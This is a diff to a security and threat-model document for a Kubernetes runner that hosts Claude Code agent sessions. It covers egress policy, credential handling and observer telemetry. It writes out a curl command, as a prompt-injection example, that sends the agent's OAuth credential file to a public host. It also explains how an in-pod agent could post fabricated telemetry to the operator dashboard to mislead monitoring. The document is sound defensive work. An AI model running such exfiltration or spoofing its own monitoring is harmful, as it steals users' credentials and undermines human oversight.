@@ -65,20 +65,41 @@ in-pod agent that already holds (or can recover) the token.
 
 ### Egress: the example allows 443 to any public host
 
-`k8s/networkpolicy-egress-allow.yaml:48-59` permits **TCP 443 to `0.0.0.0/0`**
-with only RFC1918 / CGNAT / link-local (incl. the metadata endpoint) carved out.
-Stated plainly: **this is an open exfiltration channel.** It is what turns an
-in-pod secret disclosure (A1) or a logged-secret (A2, now redacted) into remote
-exfiltration — a compromised agent can POST anything it reads to any public
-HTTPS host. The example is deliberately broad so the agent can reach
-`api.anthropic.com` and public package registries out of the box.
+The public-443 `ipBlock` rule in `k8s/networkpolicy-egress-allow.yaml` permits
+**TCP 443 to `0.0.0.0/0`** with only RFC1918 / CGNAT / link-local (incl. the
+metadata endpoint) carved out. Stated plainly: **this is an open exfiltration
+channel.** It is what turns an in-pod secret disclosure (A1) or a logged-secret
+(A2, now redacted) into remote exfiltration — a compromised agent can POST
+anything it reads to any public HTTPS host. The example is deliberately broad so
+the agent can reach `api.anthropic.com` and public package registries out of the
+box.
 
-**Hardening path:** replace the broad `ipBlock` with the specific CIDRs — or,
-better, an FQDN-scoped egress policy — for only the provider/registry hosts your
-agents actually need. If your CNI is Cilium, a `CiliumNetworkPolicy` with
-`toFQDNs` (DNS-aware egress) pins egress to named hosts (e.g.
-`api.anthropic.com`, `registry.npmjs.org`) rather than all of public 443. This
-is the single highest-leverage hardening step for a real deployment.
+**What that means for a claude-pane session:** the broad-443 example does
+**not** contain credential exfiltration, and a claude-pane session hands the
+agent a **refresh-capable credential**. The runner materializes the full Claude
+Code OAuth material — access *and* refresh token — as
+`$CLAUDE_CONFIG_DIR/.credentials.json` on the PVC (`materializeCredentials`,
+`runner/src/claude-config.ts`), and the interactive child's env allowlist
+deliberately points the pane at that dir (`buildClaudePaneEnv`,
+`runner/src/claude-pane.ts`) — the agent **must** read the file to run at all,
+so no env stripping can protect it. A single prompt-injected
+`curl --data @$CLAUDE_CONFIG_DIR/.credentials.json https://<any-public-host>`
+from the pane's Bash therefore ships a credential that **outlives the session**
+(the refresh token mints new access tokens until revoked). Under the broad
+example, network egress — the one control that could stop this — doesn't.
+Provenance: [`docs/review-2026-07-20.md`](docs/review-2026-07-20.md) §S [S1].
+
+**Hardening path:** replace the broad-443 example with an FQDN-scoped egress
+policy allowing only the provider/registry hosts your agents actually need.
+[`k8s/networkpolicy-egress-fqdn.yaml.example`](k8s/networkpolicy-egress-fqdn.yaml.example)
+is a ready-made Cilium `CiliumNetworkPolicy` (`toFQDNs`) pinning egress to the
+documented Claude Code endpoints, with commented per-backend (codex/opencode)
+and registry blocks. It requires an FQDN-aware CNI, *replaces*
+`networkpolicy-egress-allow.yaml` (keep default-deny applied), and its host set
+should be re-verified against a live session (`hubble observe`) before
+enforcement — see the header comments in the file. This is the single
+highest-leverage hardening step for a real deployment. If you cannot scope by
+FQDN, CIDR-pinning the same hosts is the weaker fallback.
 
 ### Controls in place
 
@@ -173,6 +194,28 @@ child as a non-root uid distinct from the runner, or mount `/proc` with
 See [`TODO.md`](TODO.md) §1f (`[A1 residual]`); the comments in
 `runner/src/claude.ts` say so at the call site.
 
+### Observer events are agent-influenceable (claude-pane)
+
+The claude-pane observer authenticates its hook/statusline ingestion with a
+per-session token that the runner provisions **inside** `CLAUDE_CONFIG_DIR`
+(`provisionPaneObserver`, `runner/src/claude-pane-observer.ts` — the token file
+sits next to the helper scripts, 0600 on the PVC), because the hooks run as
+children of the agent's own `claude` process and must not receive
+`RUNNER_TOKEN`. The `/observer/claude/*` routes in `runner/src/server.ts`
+accept that token (they sit before the global bearer gate for exactly this
+reason). Consequence: the in-pane agent can read its own observer token and
+POST **fabricated same-session telemetry** — fake tool/permission/usage/message
+events on the operator dashboard and in the event log — or hold a synthetic
+'busy' that stalls the idle reaper (bounded: once observer events go quiet, the
+staleness release `SYNTHETIC_BUSY_STALE_MS` in `runner/src/session.ts` frees
+the session for reaping after 5 minutes). **Do not over-trust a claude-pane
+live transcript or activity feed as an integrity record** — it reflects what
+the in-pod session reported, not a tamper-proof audit trail. Cross-session
+spoofing is not possible: the token is minted per session and the routes only
+feed that pod's own event log. This is an accepted, documented consequence of
+the observer design (provenance:
+[`docs/review-2026-07-20.md`](docs/review-2026-07-20.md) §S [S3]).
+
 ### Known trade-offs
 
 - The **Mutagen transport intentionally skips SSH host-key verification**
@@ -187,7 +230,9 @@ Known gaps; none should be assumed mitigated. Cross-referenced to
 
 - **Runner + agent share uid 0** — the A1 residual above; the top open item.
 - **Open 443-to-any example egress** — the exfil channel above; FQDN-scoped
-  egress is the fix.
+  egress is the fix. An example now ships
+  (`k8s/networkpolicy-egress-fqdn.yaml.example`) but its host set has not been
+  validated against live session traffic yet.
 - **Runner runs as root.** Moving to a non-root uid requires live validation
   because `sshd` privilege separation depends on the current layout.
 - **`PreToolUse` block uses the legacy SDK `decision:'block'` shape.** If a
